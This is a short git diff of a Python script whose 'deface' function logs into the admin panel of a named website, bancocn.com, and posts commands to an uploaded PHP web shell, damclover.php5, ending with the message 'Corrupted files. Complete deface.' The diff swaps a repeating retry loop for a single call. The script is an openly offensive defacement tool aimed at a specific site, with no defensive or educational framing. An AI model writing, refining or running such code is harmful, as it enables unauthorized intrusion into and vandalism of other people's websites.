@@ -1,6 +1,4 @@
 import requests
-from bs4 import BeautifulSoup as bs4
-import time
 
 def deface():
     login_url = "http://www.bancocn.com/admin/index.php"
@@ -119,19 +117,13 @@ def deface():
         }
         deface = session.post("http://www.bancocn.com/admin/uploads/damclover.php5", headers=shell_headers, data=data_shell)
 
-    print("Status Code:", deface.status_code)
     print("Corrupted files. Complete deface.\n")
     return deface.status_code
 
 if __name__ == "__main__":
     try:
 
-        while True:
-            sc = deface()
-            if sc == 200:
-                deface()
-            else:
-                time.sleep(30)
+        deface()
 
     except Exception as e:
         print(f"ERROR: {e}")
